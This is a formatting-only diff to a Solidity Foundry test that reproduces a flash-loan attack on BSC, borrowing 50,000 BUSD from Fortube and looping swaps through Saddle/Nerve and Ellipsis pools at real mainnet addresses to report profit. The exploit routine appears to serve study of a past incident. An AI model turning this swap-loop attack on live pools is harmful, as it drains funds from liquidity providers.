@@ -12,13 +12,7 @@ interface IFortube {
 }
 
 interface ISaddle {
-    function swap(
-        uint8 i,
-        uint8 j,
-        uint256 dx,
-        uint256 min_dy,
-        uint deadline
-    ) external returns (uint256);
+    function swap(uint8 i, uint8 j, uint256 dx, uint256 min_dy, uint256 deadline) external returns (uint256);
 
     function swapUnderlying(
         uint8 tokenIndexFrom,
@@ -38,11 +32,10 @@ interface ISwap {
     ) external returns (uint256);
 }
 
-
 contract ContractTest is Test {
     uint256 mainnetFork;
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-    
+
     IFortube flashloanProvider = IFortube(0x0cEA0832e9cdBb5D476040D58Ea07ecfbeBB7672);
     address nerve3lp = 0xf2511b5E4FB0e5E2d123004b672BA14850478C14;
     address busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
@@ -52,27 +45,27 @@ contract ContractTest is Test {
     address nerve3pool = 0x1B3771a66ee31180906972580adE9b81AFc5fCDc;
 
     function setUp() public {
-        mainnetFork = vm.createFork("bsc", 12653565);
+        mainnetFork = vm.createFork("bsc", 12_653_565);
         vm.selectFork(mainnetFork);
         cheats.label(address(flashloanProvider), "flashloanProvider");
     }
 
     function testExp() public {
         // 1. flashloan 50000 busd from fortube
-        flashloanProvider.flashloan(address(this), busd, 50000 ether, "0x");
+        flashloanProvider.flashloan(address(this), busd, 50_000 ether, "0x");
         console.log("final busd profit: ", IERC20(busd).balanceOf(address(this)) / 10 ** IERC20(busd).decimals());
     }
 
     function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata params) external {
-        IERC20(busd).approve(fusdPool, type(uint).max);
-        IERC20(fusd).approve(metaSwapPool, type(uint).max);
-        IERC20(nerve3lp).approve(nerve3pool, type(uint).max);
-        IERC20(busd).approve(metaSwapPool, type(uint).max);
+        IERC20(busd).approve(fusdPool, type(uint256).max);
+        IERC20(fusd).approve(metaSwapPool, type(uint256).max);
+        IERC20(nerve3lp).approve(nerve3pool, type(uint256).max);
+        IERC20(busd).approve(metaSwapPool, type(uint256).max);
 
-        // 2. swap from 50000 busd to fusd on Ellipsis   
-        IERC20(fusd).approve(fusdPool, type(uint).max);
+        // 2. swap from 50000 busd to fusd on Ellipsis
+        IERC20(fusd).approve(fusdPool, type(uint256).max);
         IcurveYSwap(fusdPool).exchange_underlying(1, 0, IERC20(busd).balanceOf(address(this)), 1);
-        
+
         for (uint8 i = 0; i < 7; i++) {
             swap();
         }
